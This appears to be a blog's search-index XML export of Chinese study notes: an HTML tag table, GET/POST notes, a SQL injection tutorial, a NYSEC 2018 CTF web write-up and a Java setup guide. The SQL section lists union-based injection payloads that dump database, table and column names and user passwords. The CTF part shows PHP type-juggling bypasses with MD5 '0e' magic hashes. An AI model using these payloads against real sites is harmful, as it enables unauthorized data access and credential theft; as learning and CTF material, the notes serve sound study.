|&lt;figure&gt;(http://www.runoob.com/tags/tag-figure.html) | 规定独立的流内容（图像、图表、照片、代码等等）。 |&lt;font&gt;(http://www.runoob.com/tags/tag-font.html) | HTML5不支持，不赞成使用。定义文字的字体、尺寸和颜色。 |&lt;footer&gt;(http://www.runoob.com/tags/tag-footer.html) | 定义 section 或 document 的页脚。 |&lt;form&gt;(http://www.runoob.com/tags/tag-form.html) | 定义了HTML文档的表单 |&lt;frame&gt;(http://www.runoob.com/tags/tag-frame.html) | 定义框架集的窗口或框架 |&lt;frameset&gt;(http://www.runoob.com/tags/tag-frameset.html) | 定义框架集 |&lt;h1&gt; to &lt;h6&gt;(http://www.runoob.com/tags/tag-hn.html) | 定义 HTML 标题 |&lt;head&gt;(http://www.runoob.com/tags/tag-head.html) | 定义关于文档的信息 |&lt;header&gt;(http://www.runoob.com/tags/tag-header.html) | 定义了文档的头部区域 |&lt;hr&gt;(http://www.runoob.com/tags/tag-hr.html) | 定义水平线 |&lt;html&gt;(http://www.runoob.com/tags/tag-html.html) | 定义 HTML 文档 |&lt;i&gt;(http://www.runoob.com/tags/tag-i.html) | 定义斜体字 |&lt;iframe&gt;(http://www.runoob.com/tags/tag-iframe.html) | 定义内联框架 |&lt;img&gt;(http://www.runoob.com/tags/tag-img.html) | 定义图像 |&lt;input&gt;(http://www.runoob.com/tags/tag-input.html) | 定义输入控件 |&lt;ins&gt;(http://www.runoob.com/tags/tag-ins.html) | 定义被插入文本 |&lt;kbd&gt;(http://www.runoob.com/tags/tag-kbd.html) | 定义键盘文本 |&lt;keygen&gt;(http://www.runoob.com/tags/tag-keygen.html)| 规定用于表单的密钥对生成器字段。 |&lt;label&gt;(http://www.runoob.com/tags/tag-label.html) | 定义 input 元素的标注 |&lt;legend&gt;(http://www.runoob.com/tags/tag-legend.html) | 定义 fieldset 元素的标题。 |&lt;li&gt;(http://www.runoob.com/tags/tag-li.html) | 定义列表的项目 |&lt;link&gt;(http://www.runoob.com/tags/tag-link.html) | 定义文档与外部资源的关系 |&lt;map&gt;(http://www.runoob.com/tags/tag-map.html) | 定义图像映射 |&lt;mark&gt;(http://www.runoob.com/tags/tag-mark.html)| 定义带有记号的文本。请在需要突出显示文本时使用 &lt;m&gt; 标签。 |&lt;menu&gt;(http://www.runoob.com/tags/tag-menu.html) | 不赞成使用。定义菜单列表。 |&lt;meta&gt;(http://www.runoob.com/tags/tag-meta.html) | 定义关于 HTML 文档的元信息。 |&lt;meter&gt;(http://www.runoob.com/tags/tag-meter.html)| 定义度量衡。仅用于已知最大和最小值的度量。 |&lt;nav&gt;(http://www.runoob.com/tags/tag-nav.html) | 定义导航链接的部分 |&lt;noframes&gt;(http://www.runoob.com/tags/tag-noframes.html) | 定义针对不支持框架的用户的替代内容。HTML5不支持 |&lt;noscript&gt;(http://www.runoob.com/tags/tag-noscript.html) | 定义针对不支持客户端脚本的用户的替代内容。 |&lt;object&gt;(http://www.runoob.com/tags/tag-object.html) | 定义内嵌对象 |&lt;ol&gt;(http://www.runoob.com/tags/tag-ol.html) | 定义有序列表。 |&lt;optgroup&gt;(http://www.runoob.com/tags/tag-optgroup.html) | 定义选择列表中相关选项的组合。 |&lt;option&gt;(http://www.runoob.com/tags/tag-option.html) | 定义选择列表中的选项。 |&lt;output&gt;(http://www.runoob.com/tags/tag-output.html) | 定义不同类型的输出，比如脚本的输出。 |&lt;p&gt;(http://www.runoob.com/tags/tag-p.html) | 定义段落。 |&lt;param&gt;(http://www.runoob.com/tags/tag-param.html) | 定义对象的参数。 |&lt;pre&gt;(http://www.runoob.com/tags/tag-pre.html) | 定义预格式文本。 |&lt;progress&gt;(http://www.runoob.com/tags/tag-progress.html)| 定义运行中的进度（进程）。 |&lt;q&gt;(http://www.runoob.com/tags/tag-q.html) | 定义短的引用。 |&lt;rp&gt;(http://www.runoob.com/tags/tag-rp.html) | &lt;rp&gt; 标签在 ruby 注释中使用，以定义不支持 ruby 元素的浏览器所显示的内容。 |&lt;rt&gt;(http://www.runoob.com/tags/tag-rt.html)| &lt;rt&gt; 标签定义字符（中文注音或字符）的解释或发音。 |&lt;ruby&gt;(http://www.runoob.com/tags/tag-ruby.html)| &lt;ruby&gt; 标签定义 ruby 注释（中文注音或字符）。 |&lt;s&gt;(http://www.runoob.com/tags/tag-s.html) | 不赞成使用。定义加删除线的文本。 |&lt;samp&gt;(http://www.runoob.com/tags/tag-samp.html) | 定义计算机代码样本。 |&lt;script&gt;(http://www.runoob.com/tags/tag-script.html) | 定义客户端脚本。 |&lt;section&gt;(http://www.runoob.com/tags/tag-section.html)| &lt;section&gt; 标签定义文档中的节（section、区段）。比如章节、页眉、页脚或文档中的其他部分。 |&lt;select&gt;(http://www.runoob.com/tags/tag-select.html) | 定义选择列表（下拉列表）。 |&lt;small&gt;(http://www.runoob.com/tags/tag-small.html) | 定义小号文本。 |&lt;source&gt;(http://www.runoob.com/tags/tag-source.html) | &lt;source&gt; 标签为媒介元素（比如 &lt;video&gt; 和 &lt;audio&gt;）定义媒介资源。 |&lt;span&gt;(http://www.runoob.com/tags/tag-span.html) | 定义文档中的节。 |&lt;strike&gt;(http://www.runoob.com/tags/tag-strike.html) | HTML5不支持，不赞成使用。定义加删除线文本。 |&lt;strong&gt;(http://www.runoob.com/tags/tag-strong.html) | 定义强调文本。 |&lt;style&gt;(http://www.runoob.com/tags/tag-style.html) | 定义文档的样式信息。 |&lt;sub&gt;(http://www.runoob.com/tags/tag-sub.html) | 定义下标文本。 |&lt;summary&gt;(http://www.runoob.com/tags/tag-summary.html)| &lt;summary&gt; 标签包含 details 元素的标题，&quot;details&quot; 元素用于描述有关文档或文档片段的详细信息。 |&lt;sup&gt;(http://www.runoob.com/tags/tag-sup.html) | 定义上标文本。 |&lt;table&gt;(http://www.runoob.com/tags/tag-table.html) | 定义表格。 |&lt;tbody&gt;(http://www.runoob.com/tags/tag-tbody.html) | 定义表格中的主体内容。 |&lt;td&gt;(http://www.runoob.com/tags/tag-td.html) | 定义表格中的单元。 |&lt;textarea&gt;(http://www.runoob.com/tags/tag-textarea.html) | 定义多行的文本输入控件。 |&lt;tfoot&gt;(http://www.runoob.com/tags/tag-tfoot.html) | 定义表格中的表注内容（脚注）。 |&lt;th&gt;(http://www.runoob.com/tags/tag-th.html) | 定义表格中的表头单元格。 |&lt;thead&gt;(http://www.runoob.com/tags/tag-thead.html) | 定义表格中的表头内容。 |&lt;time&gt;(http://www.runoob.com/tags/tag-time.html) | 定义日期或时间，或者两者。 |&lt;title&gt;(http://www.runoob.com/tags/tag-title.html) | 定义文档的标题。 |&lt;tr&gt;(http://www.runoob.com/tags/tag-tr.html) | 定义表格中的行。 |&lt;track&gt;(http://www.runoob.com/tags/tag-track.html)| &lt;track&gt; 标签为诸如 video 元素之类的媒介规定外部文本轨道。 |&lt;tt&gt;(http://www.runoob.com/tags/tag-tt.html) | 定义打字机文本。 |&lt;u&gt;(http://www.runoob.com/tags/tag-u.html) | 不赞成使用。定义下划线文本。 |&lt;ul&gt;(http://www.runoob.com/tags/tag-ul.html) | 定义无序列表。 |&lt;var&gt;(http://www.runoob.com/tags/tag-var.html) | 定义文本的变量部分。 |&lt;video&gt;(http://www.runoob.com/tags/tag-video.html) | &lt;video&gt; 标签定义视频，比如电影片段或其他视频流。 |&lt;wbr&gt;(http://www.runoob.com/tags/tag-wbr.html)|规定在文本中的何处适合添加换行符。 |</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Discussion on GET and POST</title>
      <link href="/2019/01/17/Discussion-on-GET-and-POST/"/>
      <url>/2019/01/17/Discussion-on-GET-and-POST/</url>
      
        <content type="html"><![CDATA[<p>前些天学习了对Get,Post,URL,burp,hackbar,web前端查看元素的相关知识，它加强了我对Get,Post的理解，对burp,hackbar有了新的认识，对web前端查看元素(shift+ctrl+c)有了不同的感触。</p><h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p>服务器+端口+路径，说白了，就是网址。。。</p><h1 id="Get与Post的区别"><a href="#Get与Post的区别" class="headerlink" title="Get与Post的区别"></a>Get与Post的区别</h1><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-a52fad0e4018d7fe.png" alt="图片.png"><br>GET一般用于获取&#x2F;查询 资源信息，而POST一般用于更新 资源信息（比如提交表单的内容）<br><strong>GET提交</strong>，请求的数据会附在URL之后（就是把数据放置在HTTP协议头中），以?分割URL和传输数据，多个参数用&amp;连接；<br>例 如：login.action?name&#x3D;hyddd&amp;password&#x3D;idontknow&amp;verify&#x3D;%E4%BD%A0 %E5%A5%BD。如果数据是英文字母&#x2F;数字，原样发送，如果是空格，转换为+，如果是中文&#x2F;其他字符，则直接把字符串用url加密，得出如： %E4%BD%A0%E5%A5%BD，其中％XX中的XX为该符号以16进制表示的ASCII。</p><p><strong>GET请求方式</strong>将请求信息放在URL后面，请求信息和URL之间以？隔开，请求信息的格式为键值对，例如 <a href="https://baike.baidu.com/item/Python/407313?fr=aladdin%EF%BC%8C%E8%BF%99%E7%A7%8D%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F%E5%B0%86%E8%AF%B7%E6%B1%82%E4%BF%A1%E6%81%AF%E7%9B%B4%E6%8E%A5%E6%9A%B4%E9%9C%B2%E5%9C%A8URL%E4%B8%AD%EF%BC%8C%E5%AE%89%E5%85%A8%E6%80%A7%E8%BE%83%E4%BD%8E%E3%80%82%E5%8F%A6%E5%A4%96%E4%BB%8E%E6%8A%A5%E6%96%87%E7%BB%93%E6%9E%84%E4%B8%8A%E6%9D%A5%E7%9C%8B%EF%BC%8C%E7%94%B1%E4%BA%8E%E8%AF%B7%E6%B1%82%E4%BF%A1%E6%81%AF%E6%94%BE%E7%BD%AE%E5%9C%A8URL%E4%B8%AD%EF%BC%8C%E5%9B%A0%E6%AD%A4%E8%AF%B7%E6%B1%82%E6%8A%A5%E6%96%87%E4%B8%AD%E4%B8%8D%E9%9C%80%E8%A6%81%E6%8A%A5%E6%96%87%E4%BD%93%E3%80%82">https://baike.baidu.com/item/Python/407313?fr=aladdin，这种请求方式将请求信息直接暴露在URL中，安全性较低。另外从报文结构上来看，由于请求信息放置在URL中，因此请求报文中不需要报文体。</a></p><p><strong>POST请求方式</strong>将请求信息放置在报文体中，相获得请求信息必须解析报文，因此安全性较GET方式要高一些（事实上要获得报文体中的请求信息也是很容易的，因此安全性上两者并没有太多的区别，具体解决传输过程中的安全性问题还要靠HTTPS），此外在请求报文中含有报文体。</p><p>　　由于GET中的请求信息放置在URL中，因此是有长度限制的，因为URL本身是有长度限制的。POST中的请求信息是放置在报文体中，因此对数据长度是没有限制的。</p><p>总结一下，Get是向服务器发索取数据的一种请求，而Post是向服务器提交数据的一种请求，在FORM（表单）中，Method默认为”GET”，实质上，GET和POST只是发送机制不同，并不是一个取一个发！</p><h2 id="Hackbar"><a href="#Hackbar" class="headerlink" title="Hackbar"></a>Hackbar</h2><p>乍一听比较高端，其实它就是个插件而已，火狐浏览器在插件中搜索它就会看到。虽然它是个插件，但是它为我们提供了不小的便利。<br>安装好后，F12查看<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-5de602b883fdb4f2.png" alt="图片.png"><br>这就是我们的奇妙的Hackbar,<img src="https://upload-images.jianshu.io/upload_images/14443259-57b1ebff2988c5bf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png">第一个按钮会给我们将URL展示出来，我们可以肆意在URL加GET请求（以？分割）<br>第二个按钮，剪刀的样子，很明显，它起到分割换行的作用，<br>第三个则是运行相当于我们输入完网址按回车键一样。<br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-a5556d3fd80bc221.png" alt="图片.png"></p><p>这些分别是POST,访客来路途径，使用者代理，终端数据</p><h2 id="通过留言板对POST-GET认识"><a href="#通过留言板对POST-GET认识" class="headerlink" title="通过留言板对POST,GET认识"></a>通过留言板对POST,GET认识</h2><p>在写完留言板之后，回顾代码，我发现用到POST的地方别多，代表是传值，而通过传值可以把用户的数据传到数据库中，十分方便，这改变了我对POST抽象的认知，而GET ，通过发送请求可以把想要的数据显示出来，即完成了从数据库索取数据。</p><h2 id="学习方法总结"><a href="#学习方法总结" class="headerlink" title="学习方法总结"></a>学习方法总结</h2><p>在留言板之前，所写的内容全部都是理论,而在写完留言板之后，进行了对理论认知的更新，这便是理论与实践相结合，大大改变了我们对理论抽象的认识。对于学习新的知识我们可以先进行理论的大概学习，再通过进行项目实践，来感知这些新的事物，你会发现那些你曾经在学习中受到困扰的问题，都会在实践中迎刃而解。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Brief Discussion on SQL Injection</title>
      <link href="/2019/01/14/Brief-Discussion-on-SQL-Injection/"/>
      <url>/2019/01/14/Brief-Discussion-on-SQL-Injection/</url>
      
        <content type="html"><![CDATA[<p><strong>sqli-labs是我对sql学习程度的检验，玩了几道题，我查询了相关知识点,总结了一些重要的语法以及知识点，还有类似的题型解法步骤，下面我将一一汇总</strong></p><h2 id="SQL注入漏洞产生的原因"><a href="#SQL注入漏洞产生的原因" class="headerlink" title="SQL注入漏洞产生的原因"></a>SQL注入漏洞产生的原因</h2><p>SQL Injection<br>    程序员在编写代码的时候，没有对用户输入数据的合法性进行判断，使应用程序存在安全隐患<br>    用户可以提交一段数据库查询代码，根据程序返回的结果，获得某些他想得知的数据或进行数据库操作</p><h2 id="SQL语句"><a href="#SQL语句" class="headerlink" title="SQL语句"></a>SQL语句</h2><p>Structured Query Language<br>    结构化的查询语言，是关系型数据库通讯的标准语言。<br>        查询：<code>SELECT statement FROM table WHERE condition</code><br>        删除记录：<code>DELETE FROM table WHERE condition</code><br>        更新记录：<code>UPDATE table SET field=value WHERE condtion</code><br>        添加记录：<code>INSERT INTO table field VALUES(values)</code></p><h2 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h2><p>1首先测试正常数据，如<code>?id=1</code><br>2)判断是否存在注入点，如在<code>?id=1+【‘】、【and 1=1】或【and 1=2】</code><br>3)判断字段长度,列数如在<code>?id=1+【‘】+【 order by 1 (数字任意)】，id=1‘ order by 1=1 # ,id=1&#39; order by 1=2 #</code><br>4判断字段回显位置，如在<code>?id=1+【‘】+【union select 1,2,3,4,5,6,7,8,9,10,11#】</code><br>5） 判断数据库信息：<br>利用内置函数暴数据库信息<br><strong>version()版本；database()数据库；user()用户；</strong><br>不用猜解可用字段暴数据库信息(有些网站不适用):<br><code>and 1=2 union all select version()</code><br><code>and 1=2 union all select database()</code><br><code>and 1=2 union all select user()</code><br>操作系统信息：<code>and 1=2 union all select @@global.version_compile_os from mysql.user</code><br>数据库权限：</p><figure class="highlight plaintext"><figcaption><span>ord(mid(user(),1,1))</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">6） 查找数据库名</span><br><span class="line">Mysql 5 以上有内置库 information_schema，存储着mysql的所有数据库和表结构信息```union select information_schema from information_schema.schemata``` （语句在显示位）</span><br><span class="line">7)查找数据库表名</span><br><span class="line">```union select group_concat(table_name) from information_schema.tables where table_schema=database()```</span><br><span class="line">8)查找列名</span><br><span class="line">```union select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; --+```</span><br><span class="line">9)获取值</span><br><span class="line">```union select group_concat(username,password) from users--+```</span><br><span class="line">或者```1&#x27; union select 1,(select 列名 from 表名),3,4#```</span><br><span class="line">0)查找数据库表中所有字段以及字段值</span><br><span class="line"></span><br><span class="line">```sql</span><br><span class="line">and 1=2 union select 1,2,3,TABLE_NAME,5,6,7,8,9,10 from information_schema.TABLES where TABLE_SCHEMA=数据库（十六进制） limit 0（开始的记录，0为第一个开始记录）,1（显示1条记录）—</span><br><span class="line">and 1=2 Union select 1,2,3,COLUMN_NAME,5,6,7,8,9,10 from information_schema.COLUMNS where TABLE_NAME=表名（十六进制）limit 0,1</span><br></pre></td></tr></table></figure><p><strong>提权</strong><br>01)猜解账号密码；<br>02） 登陆管理员后台。<br>读文件： union select 绝对路径 load_file<br>写入文件：union select</p><h2 id="判断SQL注入点"><a href="#判断SQL注入点" class="headerlink" title="判断SQL注入点"></a>判断SQL注入点</h2><p>找注入点是最关键,也最基础的一个环节<br>本质原理是:<br>    找一个需要后台处理后<br>    提交给数据库的点<br>    所有的输入只要和数据库进行交互的，都有可能触发SQL注入<br>一般为三大类</p><pre><code>Get参数触发SQL注入POST参数触发SQL注入Cookie触发SQL注入</code></pre><p>例如:<br>    在常规的链接的参数中(链接?参数) 找形如?id&#x3D;num的【,】搜索框的【,】<br>而验证是否存在注入点的方法有很多种<br>最常规,也最简单的方法，引入单引号判断是否存在注入点</p><pre><code>http://host/test.php?id=100’ 返回错误说明有可能注入http://host/test.php?id=100 and 1=1 返回正常http://host/test.php?id=100 and 1=2返回错误</code></pre><p>如果满足上面三点，是注入点的可能性就很高了</p>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NYSEC 2018 Web</title>
      <link href="/2018/12/10/NYSEC-2018-Web/"/>
      <url>/2018/12/10/NYSEC-2018-Web/</url>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="1-签到题——10’"><a href="#1-签到题——10’" class="headerlink" title="1.签到题——10’"></a>1.签到题——10’</h2><h2 id="method：复制粘贴"><a href="#method：复制粘贴" class="headerlink" title="method：复制粘贴"></a>method：复制粘贴</h2><h2 id="2-签到题2——30’"><a href="#2-签到题2——30’" class="headerlink" title="2.签到题2——30’"></a>2.签到题2——30’</h2><h2 id="method"><a href="#method" class="headerlink" title="method"></a>method</h2><p>查看元素，找到输入的元素所在位置，<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-980fd2b735c28996.png" alt="img">进行修改即可，最大长度可修改为&gt;10的任意数字，最后输入即可</p><h2 id="3-flag在这里——50’"><a href="#3-flag在这里——50’" class="headerlink" title="3.flag在这里——50’"></a>3.flag在这里——50’</h2><h2 id="method-1"><a href="#method-1" class="headerlink" title="method"></a>method</h2><p>F12 进入网络 双击 也就是进入响应器<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-cd849d02cf99adbb.png" alt="img">即可发现flag</p><h2 id="4-cookie——50’"><a href="#4-cookie——50’" class="headerlink" title="4.cookie——50’"></a>4.cookie——50’</h2><p> ##method:<br>打开burp进行抓包，<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-d26b6c91f50f5849.png" alt="img"><br>“0”代表假，改为1为真即可<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-08c8a781167f28e2.png" alt="img"></p><h2 id="5-简单的变量覆盖"><a href="#5-简单的变量覆盖" class="headerlink" title="5.简单的变量覆盖"></a>5.简单的变量覆盖</h2><h2 id="method-2"><a href="#method-2" class="headerlink" title="method"></a>method</h2><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-d39bb0efd3f8ad90.png" alt="img"><br>根据题意，我们不难发现只需让NYSEC与filename的值相等即可，但是存在一个函数file_get_contents($filename)——把文件读入一个字符串，故需要让其两者都为空即可，打开Hackbar发送GET请求，输入?NYSEC&#x3D;&amp;filename&#x3D; 即可<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-6d9e7e9b5d282693.png" alt="img"></p><h2 id="6-web50——100’"><a href="#6-web50——100’" class="headerlink" title="6.web50——100’"></a>6.web50——100’</h2><h2 id="method-3"><a href="#method-3" class="headerlink" title="method"></a>method</h2><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-c98381671f3bd319.png" alt="img"><br>乍一看与上一道题很类似，的确很像，只是多了一个md5加密，而那句的意思便是使NYSEC,password加密后都是以0E开头的MD5值，只需发送GET请求?NYSEC&#x3D;s878926199a&amp;password&#x3D;s155964671a 即可 <img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-add4ac3222427536.png" alt="img"><br>下面附上</p><h2 id="加密后以0E开头的MD5值"><a href="#加密后以0E开头的MD5值" class="headerlink" title="加密后以0E开头的MD5值"></a>加密后以0E开头的MD5值</h2><p>s878926199a<br>0e545993274517709034328855841020<br>s155964671a<br>0e342768416822451524974117254469<br>s214587387a<br>0e848240448830537924465865611904<br>s214587387a<br>0e848240448830537924465865611904<br>s878926199a<br>0e545993274517709034328855841020<br>s1091221200a<br>0e940624217856561557816327384675<br>s1885207154a<br>0e509367213418206700842008763514<br>s1502113478a<br>0e861580163291561247404381396064<br>s1885207154a<br>0e509367213418206700842008763514<br>s1836677006a<br>0e481036490867661113260034900752<br>s155964671a<br>0e342768416822451524974117254469<br>s1184209335a<br>0e072485820392773389523109082030<br>s1665632922a<br>0e731198061491163073197128363787<br>s1502113478a<br>0e861580163291561247404381396064<br>s1836677006a<br>0e481036490867661113260034900752<br>s1091221200a<br>0e940624217856561557816327384675<br>s155964671a<br>0e342768416822451524974117254469<br>s1502113478a<br>0e861580163291561247404381396064<br>s155964671a<br>0e342768416822451524974117254469<br>s1665632922a<br>0e731198061491163073197128363787<br>s155964671a<br>0e342768416822451524974117254469<br>s1091221200a<br>0e940624217856561557816327384675<br>s1836677006a<br>0e481036490867661113260034900752<br>s1885207154a<br>0e509367213418206700842008763514<br>s532378020a<br>0e220463095855511507588041205815<br>s878926199a<br>0e545993274517709034328855841020<br>s1091221200a<br>0e940624217856561557816327384675<br>s214587387a<br>0e848240448830537924465865611904<br>s1502113478a<br>0e861580163291561247404381396064<br>s1091221200a<br>0e940624217856561557816327384675<br>s1665632922a<br>0e731198061491163073197128363787<br>s1885207154a<br>0e509367213418206700842008763514<br>s1836677006a<br>0e481036490867661113260034900752<br>s1665632922a<br>0e731198061491163073197128363787<br>s878926199a<br>0e545993274517709034328855841020</p><h2 id="7-ereg截断——200’"><a href="#7-ereg截断——200’" class="headerlink" title="7.ereg截断——200’"></a>7.ereg截断——200’</h2><h2 id="method-4"><a href="#method-4" class="headerlink" title="method"></a>method</h2><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-3de98d0b5b1759af.png" alt="img"></p><p>由代码可知，正则进行匹配出现不属于[a-z,A-Z,0-9]范围内的元素就会输出报错文字，但是下面的语句又是通过strpos来查询指定字符串出现的位置，但是匹配的又是 *-*，如果是其他的情况的话就会输出Invalid password。</p><h2 id="这里我直接通过传入一个数组直接绕过"><a href="#这里我直接通过传入一个数组直接绕过" class="headerlink" title="这里我直接通过传入一个数组直接绕过"></a>这里我直接通过传入一个数组直接绕过</h2><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-98e5a4780e38fe18.png" alt="img"><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-7bf9f038f8a7e4dc.png" alt="img"></p><h2 id="8-买彩票吗——200’"><a href="#8-买彩票吗——200’" class="headerlink" title="8.买彩票吗——200’"></a>8.买彩票吗——200’</h2><h2 id="method-5"><a href="#method-5" class="headerlink" title="method"></a>method</h2><p>这是个很经典的题，既然给出了源代码，那么通过解压之后拖放到Sublime后找到核心代码，<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-d5435004910899ea.png" alt="img"><br>这里是个弱类型相比，也就是输入的任何数为true就会赢，通过抓包，我们得到<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-6058d36f6ebc239d.png" alt="img"><br>1234567，只需改为[true,true,true,true,true,true,true]<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-686f8ad79522ee5e.png" alt="img">放回之后，不难发现<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-26f1b2a691cb877a.png" alt="img">我们赢得了5000000，以此类推，直到攒够题目要求的金钱为止。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA Environment Variable Configuration</title>
      <link href="/2018/12/08/JAVA-Environment-Variable-Configuration/"/>
      <url>/2018/12/08/JAVA-Environment-Variable-Configuration/</url>
      
        <content type="html"><![CDATA[<p><strong>本篇主要从3个方面入手，具体从下载——安装——配置——测试，解决经常出现的问题。</strong></p><hr><h2 id="提纲："><a href="#提纲：" class="headerlink" title="提纲："></a><strong>提纲：</strong></h2><p><em><strong>1.JAVA环境安装包</strong></em></p><p><em><strong>2.JAVA环境安装</strong></em></p><p><em><strong>3.JAVA环境配置</strong></em></p><p><em><strong>4.JAVA环境测试</strong></em></p><hr><h2 id="（一）JAVA环境安装包"><a href="#（一）JAVA环境安装包" class="headerlink" title="（一）JAVA环境安装包"></a><strong>（一）JAVA环境安装包</strong></h2><p>链接：<a href="https://pan.baidu.com/s/1dXknN5u3H4Fxol6u_BMNcw">https://pan.baidu.com/s/1dXknN5u3H4Fxol6u_BMNcw</a></p><p>提取码：ytz9</p><h2 id="（二）JAVA环境安装"><a href="#（二）JAVA环境安装" class="headerlink" title="（二）JAVA环境安装"></a><strong>（二）JAVA环境安装</strong></h2><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-ead00713757397a7.jpg" alt="img"></p><p><strong>注意</strong></p><p>必须时系统C盘，否则在接下来配置的时候找不到文件等等各种问题，导致配置失败。</p><h2 id="（三）JAVA环境配置"><a href="#（三）JAVA环境配置" class="headerlink" title="（三）JAVA环境配置"></a><strong>（三）JAVA环境配置</strong></h2><p>a. 打开环境变量配置</p><p>1）打开控制面板——系统和安全</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-62751bf8dadd0ce6.png" alt="img"></p><p>2）点击查看RAM的大小和处理器速度</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-ff3bdbdbcaac3f9f.png" alt="img"></p><p>3）点击左侧高级系统设置</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-8172a2be3c3bd63f.png" alt="img"></p><p>4)点击环境变量</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-16d1c7f4ed70821d.png" alt="img"></p><p>b. 配置环境变量</p><p>1). JAVA_HOME 系统默认是没有的 需要新建</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-bc982da8adb9fb4b.png" alt="img"></p><p>2)变量名写JAVA_HOME</p><p>变量值写jdk的安装目录, 也就是之前的解压jdk的目录 你可以先找到这个路径 然后复制过来(比如下图中的红色部分)——C:\Program Files\Java\jre1.8.0_191</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-d9aa798fb6edd159.png" alt="img"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-e450d96cacc1549c.png" alt="img"></p><p>3)新建系统变量CLASSPATH</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-8cf636fc9802e36d.png" alt="img"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-cb12cd4918c0c94a.png" alt="img"></p><p><em><strong>注意需要将选中的所有字输入</strong></em></p><p><em><strong>.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;</strong></em></p><p><em><strong>（上述从.开始到;结束都是需要输入的）</strong></em></p><p>4）在系统变量中找到Path,双击出现如下</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-ea543dfde1ba3a2c.png" alt="img"></p><p>双击后</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-c93ae72a3a00ad39.png" alt="img"></p><p>5）双击后点击新建（新建两次）</p><p>第一次输入 <strong>%JAVA_HOME%\bin</strong></p><p>第二次输入 <strong>%JAVA_HOME%\jre\bin</strong></p><p>点击确定</p><h2 id="（四）JAVA环境测试"><a href="#（四）JAVA环境测试" class="headerlink" title="（四）JAVA环境测试"></a><strong>（四）JAVA环境测试</strong></h2><p>1）打开cmd<br>win键（键盘上的四个小方块组成的一个大方块）+r 输入cmd</p><p>2）输入java</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-ff1e406459007bdc.png" alt="img"></p><p>如果出现类似上述的情况，那么！！！！</p><p>恭喜你！配置成功！！</p><h2 id="但是"><a href="#但是" class="headerlink" title="但是"></a><strong>但是</strong></h2><h3 id="如果出现"><a href="#如果出现" class="headerlink" title="如果出现"></a>如果出现</h3><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-a973208ca688f669.png" alt="img"></p><p>那么只好按照上述步骤从新捋一遍，找到配置不到位的部分。</p><p>以上是本人在配置环境时的拙见，希望能给即将配置环境的朋友提供方便~</p>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
